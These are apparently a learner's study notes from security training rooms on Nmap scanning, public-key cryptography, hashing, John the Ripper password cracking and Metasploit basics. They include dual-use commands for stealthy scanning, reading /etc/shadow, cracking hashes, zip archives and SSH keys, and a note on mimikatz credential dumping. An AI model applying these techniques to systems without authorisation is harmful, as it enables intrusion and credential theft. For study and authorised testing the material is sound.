* **Nmap:** A open-source tool used for network discovery and security auditng. 
* **Nmap Host Discovery**
    * **Core Concept:** How to use Nmap to discover which devices are online in a network without actually scanning for running services (ports), and how Nmap's behavior changes depending on whether the network is local or remote.
    * **Key Tools and Commands:** 
        * **nmap -sn [target] -** Ping scan. Discovers live hosts without doing a port scan. Good for quietly mapping a network.
        * **nmap -sL [target] -** List Scan. Lists the IP addresses that will be scanned without actually sending any packets to them. Great for double-checking your target scope.
        * **sudo nmap... -** Run as Root. Always run Nmap with root privileges (sudo) when possible. Running as a standard user heavily limits Nmap to basic ICMP and TCP connect scans.
    * **Targeting Syntax:** 
        * IP Range: 192.168.0.1-10 (Scans IPs ending in 1 through 10)
        * Subnet: 192.168.0.1/24 (Scans the entire /24 block, equivalent to 0-255)
        * Hostname: example.thm
    * **Takeaways**
        * Scanning a Local Network (Directly Connected): When you are on the same WiFi or Ethernet as the target, Nmap uses ARP requests to find live hosts. Because it's local, Nmap can see the MAC addresses and often identify the hardware vendor (e.g., Espressif, Tuya Smart).
        * Scanning a Remote Network (Separated by a Router): When scanning targets through a router, ARP doesn't work. Instead, Nmap relies on a mix of ICMP echo requests (ping), ICMP timestamp requests, and specific TCP packets (like SYN to port 443 and ACK to port 80) to figure out if the host is breathing. You will not get MAC address info for remote hosts.
* **Nmap Port Scanning (Discovering Services)**
    * **Core Concept:** Once you know a host is alive, you need to find out what network services (like web servers, DNS, etc.) are listening for connections on its TCP or UDP ports (out of a possible 65,535 ports for each protocol).
    * **Takeaways**
        * A normal TCP connection requires a full three-way handshake (SYN -> SYN-ACK -> ACK).
        * A **Connect Scan** (-sT) completes this full handshake and then immediately tears it down. This is loud and easily logged by the target.
        * A **SYN Scan** (-sS) is "stealthy" because it only sends the initial SYN packet. If the target replies with SYN-ACK (meaning the port is open), Nmap immediately drops the connection with an RST packet before the handshake finishes, which often avoids being logged by basic applications.
        * **UDP Scanning:** UDP is connectionless, making it harder to scan. When Nmap sends a UDP packet to a closed port, it typically gets an "ICMP destination unreachable" error back. Common UDP services include DNS (port 53) and SNMP.
        * **Port Targeting:** By default, Nmap scans the top 1,000 most common ports. You can manipulate this to speed up or deepen your scan depending on your needs.
    * **Command Reference**
        * **-sT:** TCP Connect Scan (Completes the full three-way handshake)
        * **-sS:** TCP SYN Scan (Stealth half-open scan)
        * **-sU:** UDP Scan (Scans for UDP-based services)
        * **-F** Fast Mode (Scans only the 100 most common ports)
        * **-p[range]:** specify ports (e.g -p10-1024 scans that specific range)
        * **-p- :** All Ports (Scans all 65,535 ports)
        * **-p1-1023 :** Well-Known Ports (Scans the standard well-known port range)
* **Nmap Adv. Scanning (OS, Version and Forced Scans)**
    * **Core Concept:** Once you find open ports, Nmap can interrogate the target deeper to guess its Operating System, identify the exact versions of running services, and force scans against stealthy hosts that block standard pings.
    * **Takeaways:**
        * **OS Detection:** Nmap relies on TCP/IP stack fingerprinting (analyzing various subtle network responses) to make an educated guess about the target's operating system. It is highly accurate but not always 100% perfect.  
        * **Service and Version Detection:** Knowing a port is open isn't enough; you need to know what is running to find vulnerabilities. Nmap interrogates the service to pull banners and version numbers (e.g., identifying "OpenSSH 8.9p1" instead of just knowing port 22 is open).
        * **Aggressive Scanning:** You can combine multiple deep-scan features—like OS detection, version scanning, default script scanning, and traceroute—into one convenient (but noisy) command.
        * **Forcing the Scan:** If a target firewall blocks ICMP (ping) requests, Nmap's default host discovery phase will incorrectly assume the host is dead and skip the port scan. Forcing the scan tells Nmap to skip the ping phase, assume the host is alive, and scan it anyway.
    * **Commands Reference**
        * **-O:** OS detection (Guesses the target's operating system)
        * **-sV:** Service and version detection (Identifies specific software versions listening on open ports)
        * **-A:** Aggressive scan (Enables OS detection, version detection, script scanning, and traceroute all at once).
        * **-Pn** Treat all hosts as online / Skip host discovery (Crucial for scanning hosts that don't respond to pings).
* **Nmap Timing and Performance**
    * **Core Concepts:**
        * **Evasion via Speed:** Running scans at default speeds can easily trigger security alerts. Slowing down a scan (e.g. using paranoid or sneaky timing) makes it "quieter" on the network.
        * **Automatic Adjustment:** By default, Nmap automatically scales its parallel probes based on network reliability. It will drop to 1 probe on poor, lossy networks, but scale up to hundreds on flawless connections.

    * **Tools & Commands (Timing & Performance Options):**
        * `nmap -T<0-5> <target>`: **Timing Templates**. Adjusts the overall speed and timing of the scan.
        * `-T0` (**paranoid**): Extremely slow (waits ~5 mins between ports). Great for extreme stealth.
        * `-T1` (**sneaky**): Very slow (waits ~15 secs between ports).
        * `-T2` (**polite**): Slower than normal (waits ~0.4 secs between ports).
        * `-T3` (**normal**): The default Nmap speed.
        * `-T4` (**aggressive**): Fast, assumes a reliable and fast network.
        * `-T5` (**insane**): Fastest, requires an exceptionally stable network or packets will drop.
        * `--min-parallelism <num>` & `--max-parallelism <num>`: Manually sets the minimum and maximum number of simultaneous port probes.
        * `--min-rate <number>` & `--max-rate <number>`: Sets the minimum and maximum packet sending rate (**in packets per second**). *Note: This applies to the entire scan, not just a single host.*
        * `--host-timeout <time>`: Sets the maximum time to wait for a specific target host to respond. This is highly useful for preventing extremely slow hosts from stalling your whole scan.

    * **Takeaways:**
        * While timing templates (`-T`) are the easiest way to adjust speed, using specific parallelism and rate arguments gives you granular control when dealing with tricky firewalls, heavy rate limiting, or unstable VPN connections.
* **Nmap Verbosity and Output Formats**
    
    * **Core Concepts:**
        * **Real-time Monitoring:** Scans can take a long time to finish. Enabling verbosity shows you exactly what Nmap is doing behind the scenes, broken down by stages (e.g., ARP Ping -> Parallel DNS Resolution -> SYN Stealth Scan).
        * **Data Retention:** Always save your scan results. Relying only on terminal output means you lose your data if the terminal closes, requiring a noisy and time-consuming rescan.

    * **Tools & Commands:**
    * **Verbosity & Debugging:**
        * `nmap -v <target>`: **Verbose output**. Shows scan progress and stages.
        * `nmap -vv` or `-v<level>`: **Higher verbosity**. You can specify levels (e.g., `-v4`) or just type `v` on your keyboard while a scan is actively running to increase it on the fly.
        * `nmap -d` or `-d<level>`: **Debugging output**. Provides overwhelming detail for troubleshooting. Max level is `-d9`.
    * **Output Formats:**
        * `-oN <filename>`: **Normal output**. Saves the results exactly as they appear in the terminal.
        * `-oX <filename>`: **XML output**. Useful for importing into other security tools or parsing with scripts.
        * `-oG <filename>`: **Grepable output**. Puts the results into a format that is easy to parse using command-line tools like `grep` and `awk`.
        * `-oA <basename>`: **All formats**. The best of all worlds. This saves the results in Normal (`.nmap`), XML (`.xml`), and Grepable (`.gnmap`) formats simultaneously under the base name you provide.

    *   **Takeaways / Notes:**
        * Using `-oA` is widely considered a best practice during engagements or CTFs because it gives you a human-readable file for your notes and easily parsable files for scripting.

---

## Room: [Public Key Crytography Basics]
**Key Concepts:**
* **RSA** is a method for encrypting data using two keys: one to lock (encrypt) and another to unlock (decrypt) it, relying on the difficulty of factoring large number.
* **The Core Premise:** RSA's security relies on the immense computational difficulty of factoring the product of two extremely large prime numbers. Multiplying them together is trivial; factoring the original primes back out of the product is incredibly hard.
* **Asymmetric Encryption:** Uses a **Public Key** (shared with everyone) to encrypt data, and a mathematically linked **Private Key** (kept tightly secured) to decrypt it.
* **The Variables (Crucial for CTFs):**
    * $p$ and $q$: Two distinct, large prime numbers.
    * $n$: The modulus, calculated as $n=p \times q$.
    * $\phi(n)$: Euler's totient function, calculated in this context as $\phi(n)=n-p-q+1$.
    * $e$: The public exponent (chosen to be relatively prime to $\phi(n)$).
    * $d$: The private exponent, calculated so that $e \times d \equiv 1 \pmod{\phi(n)}$.
    * $m$ (or $x$): The original plaintext message.
    * $c$ (or $y$): The encrypted ciphertext.

**Tools & Commands:**
* `RsaCtfTool`: A highly recommended automated tool for breaking weak RSA encryptions in CTFs. It attempts multiple known attacks against a given public key or ciphertext.
* `rsatool`: Another excellent command-line utility for calculating RSA variables and manipulating keys.

**Takeaways / Notes:**
* In cryptography CTF challenges, you are typically provided with a partial set of these variables (for example, $n$, $e$, and $c$). Your goal is to figure out the missing variables (often requiring you to find a way to factor $n$ into $p$ and $q$) so you can calculate $d$ and decrypt the ciphertext to grab the flag.

**Diffie-Hellman**

**Key Concepts:**
* **The Problem:** Symmetric encryption is fast and efficient, but sharing the secret key over the internet is dangerous. If an attacker intercepts the key, the encryption is broken.
* **The Solution (Diffie-Hellman):** Allows two parties to independently generate the *exact same* secret key by combining public materials with their own private secrets. The actual secret key is never transmitted across the network.
* **The Math / Variables:**
    * **Public Variables (Agreed upon & shared):** * $p$: A large prime number.
        * $g$: A generator, where $0<g<p$.
    * **Private Keys (Kept secret):** * $a$: Alice's chosen private integer.
        * $b$: Bob's chosen private integer.
    * **Public Keys (Calculated & exchanged over the network):**
        * Alice's Public Key: $$A=g^a \pmod{p}$$
        * Bob's Public Key: $$B=g^b \pmod{p}$$
    * **Shared Secret (Calculated independently):**
        * Alice computes: $$B^a \pmod{p}$$
        * Bob computes: $$A^b \pmod{p}$$
        * Both calculations mathematically result in the exact same shared secret: $$g^{ab} \pmod{p}$$

**Tools & Protocols:**
* **Diffie-Hellman (DH):** Used specifically for *key agreement* (creating the shared secret).
* **RSA:** Often used alongside DH for *authentication* and *digital signatures*. 

**Takeaways / Notes:**
* On its own, Diffie-Hellman does not verify *who* is on the other end of the connection. This makes it highly vulnerable to Man-in-the-Middle (MitM) attacks (e.g., an attacker intercepts the public keys and swaps them with their own). 
* To fix this, DH is almost always implemented alongside RSA. RSA digital signatures verify the identities of the communicating parties, ensuring Alice is actually doing the DH exchange with Bob, not an attacker.

---

## Room: [Hashing Basics]

**Key Concepts:**
* **Hashing vs. Encryption:** Hashing is a *one-way* process. Unlike encryption, there is no key, and it is designed to be computationally impossible to reverse a hash back into its original plaintext input.
* **The Process:** A hash function takes data of *any* size and condenses it into a fixed-size summary, known as a **digest**.
* **Extreme Sensitivity:** A hallmark of a good hash function is that changing even a single bit of the input data (like changing "T" to "U") completely changes the resulting hash. 
* **Real-World Application:** Servers rarely store your actual password. Instead, they store the *hash* of your password. When you log in, the server hashes what you typed and compares it to the stored hash. 
* **Hash Collisions & The Pigeonhole Principle:**
    * A **hash collision** occurs when two entirely different inputs produce the exact same hash output.
    * Because there are infinite possible inputs but a fixed, finite number of outputs, collisions are a mathematical inevitability. This is known as the **pigeonhole principle** (e.g., if you have 21 pigeons and 16 holes, some pigeons must share a hole).
    * If a hash function uses a 4-bit output, the total number of possible hash values is calculated as:
      $$2^{\text{number\_of\_bits}} = 2^4 = 16$$

**Tools & Commands:**
* `hexdump -C <file>`: Displays the raw byte contents of a file in hexadecimal format alongside its ASCII representation. Useful for seeing bit-level differences.
* `md5sum <file>`: Calculates the MD5 hash of a file. Outputs in hexadecimal format.
* `sha1sum <file>`: Calculates the SHA1 hash of a file.
* `sha256sum <file>`: Calculates the SHA-256 hash of a file.

**Takeaways / Notes:**
* **MD5 and SHA1 are broken.** Attackers have figured out how to intentionally engineer hash collisions for these algorithms. Because of this, you should never trust MD5 or SHA1 for hashing passwords or securing sensitive data in modern applications.

**Insecure Password Storage**
* **Insecure Password Storage:** Methods include: Storing passwords in plaintext, Storing passwords using a deprecated encryption, Storing passwords using an insecure hashing algorithm.

**Secure Password Storage:**
* **The Problem with Basic Hashing:** If two users have the exact same password, they will generate the exact same hash. If an attacker cracks one, they compromise both accounts. 
* **Rainbow Tables:** Massive, precomputed lookup tables that map plain-text passwords directly to their corresponding hashes. 
    * *How it works:* Instead of spending computing power to crack a hash on the fly, attackers simply look up the hash in their database to see the original password. It trades cracking time for massive hard drive storage space.

* **The Solution: Salting:** A "salt" is a randomly generated string of characters appended (or prepended) to a password *before* it gets hashed. 
    * *Why it works:* Because each user gets a unique salt, two users with the exact same password will end up with entirely different final hashes. This completely neutralizes Rainbow Tables because an attacker would need to compute a separate massive table for every single possible salt.
    * *Note:* Salts do not need to be kept secret. They are stored in plain text right next to the hash in the database.

* **Hashing vs. Encryption:** Why not just encrypt passwords? Because encryption is a two-way street. If you encrypt passwords, you must store the decryption key somewhere. If a hacker breaches your server and steals the database *and* the key, every single password is instantly exposed. Hashing is a one-way street, preventing this entirely.

**Secure Password Storage Workflow:**
1. Select a modern, secure hashing algorithm (e.g., Argon2, Scrypt, Bcrypt, or PBKDF2).
2. Generate a unique, random salt for the new user (e.g., `Y4UV*^(=go_!`).
3. Concatenate the user's password with the salt (e.g., `AL4RMc10kY4UV*^(=go_!`).
4. Calculate the hash of that combined string.
5. Store the final hash *and* the unique salt in the user's database record.

**Tools & Resources:**
* **CrackStation & Hashes.com:** Websites that utilize massive internal Rainbow Tables to instantly crack basic, unsalted hashes. 
* **Argon2, Scrypt, Bcrypt:** Industry-standard hashing algorithms. Unlike MD5 or SHA, these are specifically designed for passwords—they automatically handle salting and are intentionally slow to compute, making brute-force attacks painfully inefficient.

**Takeaways / Notes:**
* Never use raw MD5 or SHA algorithms for storing user passwords, and definitely never try to write your own custom cryptographic functions. Always default to established standards like Bcrypt or Argon2.

**Password Hashes:**
* **Context is King:** Automated hash identification tools are helpful but often unreliable because many hashes look visually identical (e.g., NTLM and MD5 are both 32-character hex strings). Knowing *where* you found the hash (e.g., a Windows box vs. a web application) is your best clue.
* **Linux Password Storage (`/etc/shadow`):** * Passwords are no longer stored in `/etc/passwd`. They are kept in `/etc/shadow`, which requires `root` privileges to read.
    * The file contains nine colon-separated (`:`) fields. The second field contains the actual hashed password data.
* **Linux Hash Format:** The password field itself is broken down into four parts separated by dollar signs: `$prefix$options$salt$hash`.
    * **Prefixes (from strongest/newest to weakest):**
        * `$y$`: yescrypt (Modern Linux default)
        * `$gy$`: gost-yescrypt
        * `$7$`: scrypt
        * `$2b$`, `$2y$`, `$2a$`, `$2x$`: bcrypt
        * `$6$`: sha512crypt
        * `$md5$`: SunMD5
        * `$1$`: md5crypt
* **Windows Password Storage (SAM & NTLM):**
    * Windows stores passwords in the SAM (Security Accounts Manager) database.
    * They are hashed using **NTLM** (a variant of MD4). 
    * Windows hashes are often split into NT hashes and legacy LM hashes.

**Tools & Commands:**
* `hashID`: An automated command-line tool for recognizing hash types. *Use with a grain of salt and cross-reference with context.*
* `mimikatz`: A powerful post-exploitation tool used on Windows to bypass security and dump password hashes directly from the SAM database or memory.
* `sudo cat /etc/shadow`: The command used to view stored Linux hashes (requires privilege escalation).

**Takeaways / Notes:**
* If you ever encounter a hash format you don't recognize, the **Hashcat Example Hashes** page is the ultimate cheat sheet. It lists almost every hash format imaginable along with its corresponding mode number for cracking.
* Never underestimate the power of simply researching the underlying application that generated the hash!

**Integrity Checking:**
* **File Integrity Checking (Checksums):** Because a hash changes drastically if even one bit is altered, hashing is the perfect way to verify that a file hasn't been corrupted or maliciously modified. When you download software (like a Linux ISO), developers often provide a signed checksum file to verify your download matches their original file exactly.
* **De-duplication:** If two files generate the exact same hash, they are identical. This is widely used in storage systems to find and eliminate duplicate files.
* **HMAC (Keyed-Hash Message Authentication Code):** While standard hashes prove *integrity*, they don't prove *who* made the hash. An HMAC solves this by combining a cryptographic hash function with a secret key.
    * **Integrity:** The hash ensures the message hasn't been altered.
    * **Authenticity:** The secret key ensures the message actually came from the person who holds that key.

* **How HMAC Works (The Math):**
    1. The secret key is padded to fit the hash function's block size.
    2. The padded key is XORed ($\oplus$) with an inner constant (`ipad`).
    3. The message is appended to the result, and that entire string is hashed.
    4. The padded key is XORed with an outer constant (`opad`).
    5. The hash from step 3 is appended to the result of step 4, and hashed one final time.

**Tools & Commands:**
* `sha256sum <file>`: The command used to generate a file's hash so you can manually compare it against the official checksum provided by a software vendor.

**Takeaways / Notes:**
* Always check the hashes of binaries, executables, or ISOs you download from the internet, especially if you are grabbing them from third-party mirrors. It takes five seconds but prevents you from installing backdoored software!

**Hashing, Encoding & Encryption**
* **Hashing (One-Way):** Takes data of any size and creates a fixed-size unique summary (digest). It is meant to be computationally impossible to reverse. *Purpose: Integrity and verification.*
* **Encoding (Two-Way, No Key):** Converts data from one format to another simply to make it compatible with a specific system (e.g., converting binary data to text so it can be sent in an email). Anyone can reverse it if they know the encoding method (like ASCII, UTF-8, or Base64). It provides zero confidentiality. *Purpose: Usability and compatibility.*
* **Encryption (Two-Way, Requires Key):** Scrambles data using a cryptographic cipher to protect its confidentiality. It is fully reversible, but *only* if you possess the correct secret key. *Purpose: Confidentiality.*

**Tools & Commands:**
* `base64`: Encodes standard input into Base64 format. (In Linux, type the command, type your text, press Enter, and then press `Ctrl+D` to signify the end of the file/input).
* `base64 -d`: Decodes a Base64 string back into plain text.

**Takeaways / Notes:**
* **Encoding is not security!** This is a massive trap in CTFs and real-world web apps. Just because a string looks like gibberish (e.g., `VHJ5SGFja01lCg==`) does not mean it is encrypted. If it's just Base64 encoded, you can decode it in seconds without needing a password or key.

---

## Room: [John the Ripper: Basics]
**John the Ripper:** a free and open-source password-cracking tool. It can crack passwords stored in various formats, including hashes, passwords, and encrypted private keys. It can be used to test passwords' security and recover lost passwords.

**Key Concepts:**
* **Hashes (Review):** Algorithms (like MD5 or SHA1) that take input of any length and produce a fixed-length string. For example, both "polo" and "polomints" result in exactly 32-character MD5 hashes.
* **Why Hashes are Secure (P vs. NP):**
    * **P (Polynomial Time):** Problems that a computer can solve efficiently (e.g., sorting a list or *calculating a hash*).
    * **NP (Non-deterministic Polynomial Time):** Problems where a solution is easy to *check*, but computationally infeasible to *find* from scratch (e.g., *reversing a hash*).
    * *Conclusion:* You cannot mathematically "un-hash" a value.
* **The Dictionary Attack:** Since we cannot reverse a hash, we have to guess the input. We take a massive list of common passwords (a dictionary), hash every single word in that list using the same algorithm, and compare our generated hashes against the target hash. If they match, we found the password!

**Tools & Commands:**
* **John the Ripper (Jumbo John):** An extremely popular, fast, and versatile open-source tool used specifically for conducting brute-force and dictionary attacks against various hash types. 

**Takeaways / Notes:**
* Whenever a CTF requires you to crack a hash, your go-to method will almost always be a dictionary attack using a tool like John the Ripper, rather than trying to cryptographically break the algorithm itself.

**Basic Hash Cracking**
* **Automatic vs. Manual Cracking:** John has a built-in feature to auto-detect hash types. While convenient, it can be unreliable or inefficient. It is often better to manually identify the hash and explicitly tell John what format to use.
* **Standard Hash Prefixes:** When specifying formats for standard hashes (like MD5 or SHA1) in John, you frequently need to use the `raw-` prefix (e.g., `raw-md5` instead of just `md5`).

**Tools & Commands:**
* **John the Ripper - Basic Syntax:**
  `john [options] [file path]`
* **Automatic Cracking (Auto-detect format):**
  `john --wordlist=[path to wordlist] [path to file]`
  *Example:* `john --wordlist=/usr/share/wordlists/rockyou.txt hash_to_crack.txt`
  
* **Format-Specific Cracking (Manual format):**
  `john --format=[format] --wordlist=[path to wordlist] [path to file]`
  *Example:* `john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash_to_crack.txt`
* **Format Discovery:**
  `john --list=formats | grep -iF "md5"`: Lists all supported formats in JtR and filters for "md5" to help you find the exact format string John expects.
* **Hash-Identifier:** A Python tool to help figure out what type of hash you are looking at.
  `wget https://gitlab.com/kalilinux/packages/hash-identifier/-/raw/kali/master/hash-id.py`
  `python3 hash-id.py` (Then paste the hash when prompted).
  

**Takeaways / Notes:**
* `rockyou.txt` is the gold standard wordlist for CTFs and basic cracking. It's usually located at `/usr/share/wordlists/rockyou.txt` on Kali and Parrot OS.
* If John refuses to crack a standard hash, double-check that you included the `raw-` prefix in the `--format` flag!

**etc/shadow hashes exercise**

**The Split Files:** Modern Linux systems separate user account information from the actual password hashes for security. 
    * `/etc/passwd`: Contains user info (readable by anyone).
    * `/etc/shadow`: Contains the actual password hashes (readable only by `root`).
* **Unshadowing:** John the Ripper needs context from *both* files to correctly correlate usernames with their respective hashes. You cannot just feed it the shadow file directly. You must combine them using a tool called `unshadow`.
* **Targeted Cracking:** You don't need the entire `/etc/passwd` and `/etc/shadow` files. If you only want to crack a specific user (like `root`), you can just copy their individual line from both files into your own local text files and unshadow those.

**Tools & Commands:**
* **`unshadow`:** A utility built into the John the Ripper suite.
  `unshadow [path to passwd] [path to shadow] > [output_file.txt]`
  *Example:* `unshadow local_passwd local_shadow > unshadowed.txt`
* **Cracking the Unshadowed File:**
  `john --wordlist=[path to wordlist] [unshadowed file]`
  *Example:* `john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt`
* **Format Override (If Needed):** Usually, John auto-detects the format of an unshadowed file. If it struggles, you can explicitly define the format (e.g., if the shadow file uses `$6$`, it's SHA-512).
  *Example:* `john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt unshadowed.txt`

**Takeaways / Notes:**
* Getting access to `/etc/shadow` is a huge win during an engagement. Once you pull those files back to your attack machine, you can use your own CPU/GPU power to crack the passwords offline without alerting the target system!

**Single Crack Mode**

* **Single Crack Mode:** A mode in John the Ripper that uses the username (and other account info) to guess the password. It assumes users often create weak passwords based on their own names or details.
* **Word Mangling:** The process where John creates a custom, targeted wordlist on the fly by mutating the known information. It applies built-in "mangling rules" to alter the case, append numbers, or add special characters. 
    * *Example:* If the username is "Markus", John will automatically try `Markus1`, `MArkus`, `Markus!`, etc.
* **GECOS Field:** In UNIX/Linux systems, the `/etc/passwd` file separates user data into fields using colons (`:`). The 5th field is the GECOS (General Electric Comprehensive Operating System) field, which stores extra account details like the user's full name, phone number, and office number. John can pull this data and use it for word mangling.

**Tools & Commands:**
* **Running Single Crack Mode:**
  `john --single --format=[format] [path to file]`
  *Example:* `john --single --format=raw-sha256 hashes.txt`
* **Crucial File Formatting:**
  For Single mode to work, John *must* know the username associated with the target hash so it can mangle it. If you just have a raw hash file, you must edit it to prepend the username and a colon.
  * *Incorrect:* `1efee03cdcb96d90ad48ccc7b8666033`
  * *Correct:* `mike:1efee03cdcb96d90ad48ccc7b8666033`

**Takeaways / Notes:**
* Single Crack mode is incredibly fast because it's generating a very small, highly targeted list of guesses. It should often be your first step before launching a massive, time-consuming dictionary attack with `rockyou.txt`.

**Custom Rules**

* **Exploiting Predictability:** Password complexity requirements (capital letter, number, symbol) are good in theory, but humans are predictable. A massive percentage of users simply capitalize the first letter of their base password and append a number and a symbol at the end (e.g., `Polopassword1!`). Custom rules let us automate this exact mutation against our wordlists.
* **The Configuration File:** Custom rules are defined inside the `john.conf` file. 
    * Standard Linux Installs: `/etc/john/john.conf`

**Custom Rule Syntax (`john.conf`):**
Rules use a RegEx-style syntax. You must define a header name for the rule, followed by the modifiers and character sets.

* **The Header:** `[List.Rules:RuleName]` (This defines what you will call in the command line).
* **Common Modifiers:**
    * `c`: Capitalizes the character positionally (usually the first letter).
    * `Az`: Appends characters to the end of the word.
    * `A0`: Prepends characters to the beginning of the word.
* **Character Sets (Enclosed in `[ ]` and `""`):**
    * `[0-9]`: Includes numbers 0-9.
    * `[A-Z]`: Includes only uppercase letters.
    * `[a-z]`: Includes only lowercase letters.
    * `[!£$%@]`: Includes specific symbols.

**Example Implementation:**
To target the `Polopassword1!` pattern using a base wordlist containing `polopassword`, you would add this to your `john.conf`:

> `[List.Rules:PoloPassword]`
> `cAz"[0-9] [!£$%@]"`

*Breakdown of the rule:* Capitalize the first letter (`c`), append to the end (`Az`), add one number (`[0-9]`), and add one symbol (`[!£$%@]`).

**Tools & Commands:**
* **Running a Custom Rule:**
  `john --wordlist=[path to wordlist] --rule=[RuleName] [path to target file]`
  *Example:* `john --wordlist=/usr/share/wordlists/rockyou.txt --rule=PoloPassword hashes.txt`

**Takeaways / Notes:**
* Writing rules is like writing RegEx—it helps to talk out the pattern out loud!
* Jumbo John already includes a massive list of pre-built custom rules around line 678 of `john.conf`. Always check there first to see how complex rules are constructed if your syntax isn't working.

**Password Protected Zip Files**

* With John, it is possible to crack the password on password-protected Zip files, utilizing Zip2John.
* zip2john [options] [zip file] > [output file] to get the hash of the zip file

**Password Protected RAR Archive**
* Similar process is used to obtain the password for RAR archives (compressed files created by the WinRAR archive manager).
* Use rar2john instead of zip2john.
* Basic Syntax: rar2john [rar file] > [output file]

**SSH Key with John**
* using John to crack the SSH private key password of id_rsa files
* ssh2john converts the id_rsa private key, which is used to log in to the SSH session, into a hash format that John can work with. 
* ssh2john [id_rsa private key file] > [output file]

---

## Room: [Metasploit: Introduction]

**Key Concepts:**
* **The Framework:** Metasploit is the most widely used exploitation framework in the industry. It is designed to support a penetration tester through every single phase of an engagement (Information Gathering $\rightarrow$ Scanning $\rightarrow$ Exploitation $\rightarrow$ Post-Exploitation).
* **The Two Versions:**
    * **Metasploit Pro:** The commercial, paid version. It features a full Graphical User Interface (GUI) and heavily automates task management and exploitation.
    * **Metasploit Framework:** The open-source, free version. It is entirely command-line based and is the standard version pre-installed on Kali Linux and the TryHackMe AttackBox. 
* **Core Components:**
    * **msfconsole:** The primary command-line interface where you will spend 99% of your time interacting with the framework.
    * **Modules:** The actual building blocks of Metasploit. These include the specific exploits, scanners, and payloads you will launch at a target.
    * **Tools:** Stand-alone utility programs bundled with Metasploit to assist in specific tasks (like payload generation or vulnerability research).

**Tools & Commands:**
* `msfconsole`: The command used in your Linux terminal to launch the Metasploit Framework interface.
* `msfvenom`: A crucial stand-alone tool within the framework used specifically for generating custom malicious payloads (which will be covered later in this room). 
* `pattern_create` & `pattern_offset`: Stand-alone tools used for exploit development and buffer overflows (outside the scope of basic usage, but good to know they exist!).

**Takeaways / Notes:**
* This room focuses entirely on the open-source **Metasploit Framework** via the command line. Mastering `msfconsole` is an absolute must for any aspiring penetration tester, as it is a staple in both CTFs and real-world engagements.

**Main Components**
* **The Core Terminology:**
    * **Vulnerability:** A design, coding, or logic flaw in a target system.
    * **Exploit:** The specific piece of code that takes advantage of the vulnerability.
    * **Payload:** The code that actually runs on the target system *after* the exploit succeeds (e.g., the code that gives you a reverse shell or creates a backdoor).


* **Metasploit Modules (The Building Blocks):**
    * **Auxiliary:** Supporting modules used for information gathering. Includes scanners, crawlers, and fuzzers. (No payloads are sent here).
    * **Exploits:** Organized by target operating system (Windows, Linux, Apple, etc.). These are the scripts that break into the system.
    * **Payloads:** The code executed upon successful exploitation.
    * **Post:** Post-exploitation modules used *after* you have a shell. Used to pivot, gather hashes, or escalate privileges.
    * **Encoders:** Used to encode exploits/payloads to avoid detection by signature-based Antivirus (AV). *Note: Modern AV often catches these anyway.*
    * **Evasion:** Modules specifically designed to actively evade AV and security software.
    * **NOPs (No OPeration):** Machine code instructions (like `0x90` in x86) that tell the CPU to do absolutely nothing. Used heavily in buffer overflows to pad payloads to the correct memory size.

* **Understanding Payloads (Crucial Concept):**
    * **Adapters:** Wraps a single payload into a different format (like a PowerShell command).
    * **Singles (Inline):** Self-contained payloads. The entire code is sent at once. Good for simple tasks (e.g., adding a user, popping `calc.exe`).
    * **Stagers & Stages (Staged):** For complex payloads, sending it all at once might crash the exploit or get caught. Instead, you send a tiny **Stager** to establish a connection back to you, and then the stager downloads the rest of the bulky payload (the **Stage**).

**Tools & Commands:**
* `msfconsole`: The command to launch the primary Metasploit interface.

**Takeaways / Notes:**
* **How to spot the difference between Staged and Single payloads in Metasploit:**
    * Look at the naming convention! 
    * Underscore (`_`) = **Single/Inline** (e.g., `windows/x64/shell_reverse_tcp`). The whole payload is sent at once.
    * Forward Slash (`/`) = **Staged** (e.g., `windows/x64/shell/reverse_tcp`). It sends a stager to catch the final stage.

**Msfconsole**

* **Terminal Integration:** `msfconsole` acts like a standard Linux shell. You can run normal commands like `ls`, `ping`, and `clear` directly from the prompt. However, shell features like output redirection (`>`) are not supported.
* **Context Management:** When you select a module, you "enter" its context (your prompt will change to reflect this). Variables you set here (like target IPs) are local to this specific module unless you intentionally set them as global variables.
* **Module Rankings:** Metasploit ranks exploits based on their reliability and the likelihood of them crashing the target. Rankings range from `Excellent` down to `Manual`. 

* *Note:* Even highly ranked exploits can cause unexpected behavior or crash a service, so always exercise caution.


**Tools & Commands:**
* **General Navigation:**
  * `msfconsole`: Launches the Metasploit interface.
  * `Tab` key: Heavily supported! Use tab-completion to auto-fill module paths and commands.
  * `history`: Shows your previously typed commands.
  * `help <command>`: Shows the usage and syntax for a specific command (e.g., `help set`).
* **Searching & Selecting:**
  * `search <keyword>`: Searches the database. You can use complex filters like `search type:auxiliary telnet` or `search cve:2017`.
  * `use <module_path>` or `use <number>`: Selects a module and enters its context. (e.g., `use 0` selects the first result from your previous search).
* **Module Interaction (Inside a Context):**
  * `show options`: Displays all variables (like `RHOSTS`, `RPORT`) required to run the current module.
  * `show payloads`: Lists all payloads that are compatible with the currently selected exploit.
  * `info`: Displays detailed documentation for the module, including its description, authors, and CVE references.
  * `back`: Exits the current module's context and returns to the global `msf6 >` prompt.

**Takeaways / Notes:**
* Being able to type `use 0` instead of copying and pasting a massive module path like `exploit/windows/smb/ms17_010_eternalblue` will save you time.

**Modules**

**Key Concepts:**
* **Context is Everything (The 5 Prompts):** Metasploit has different layers of prompts. Always check your prompt to know what commands are available:
    1. `root@attackbox:~#`: Standard Linux terminal (MSF is not running).
    2. `msf6 >`: Global Metasploit prompt.
    3. `msf6 exploit(...) >`: Module context prompt (you are inside an exploit).
    4. `meterpreter >`: The Metasploit payload prompt (you have a connection to the target).
    5. `C:\Windows\system32>` or `$`: Target system shell (you are typing directly into the victim's OS).



* **Global vs. Local Variables:** Variables set with `set` only apply to the current module. If you switch to a different module, you lose them. Variables set with `setg` (set global) persist across all modules until you close Metasploit.

**Common Variables:**
| Variable | Description |
| :--- | :--- |
| **RHOSTS** | Target IP(s). Accepts single IPs, CIDR networks (`/24`), ranges, or a text file (`file:/path/to/targets.txt`). |
| **RPORT** | Target port the vulnerable service is running on. |
| **PAYLOAD** | The specific payload to deliver upon successful exploitation. |
| **LHOST** | Your attacking machine's IP address (where the reverse shell connects back). |
| **LPORT** | Your attacking machine's listening port. |
| **SESSION** | The ID of an already established connection (used heavily in Post-Exploitation modules). |

**Tools & Commands:**
* **Setting Parameters:**
  * `show options`: Displays all variables (and if they are required) for the current module.
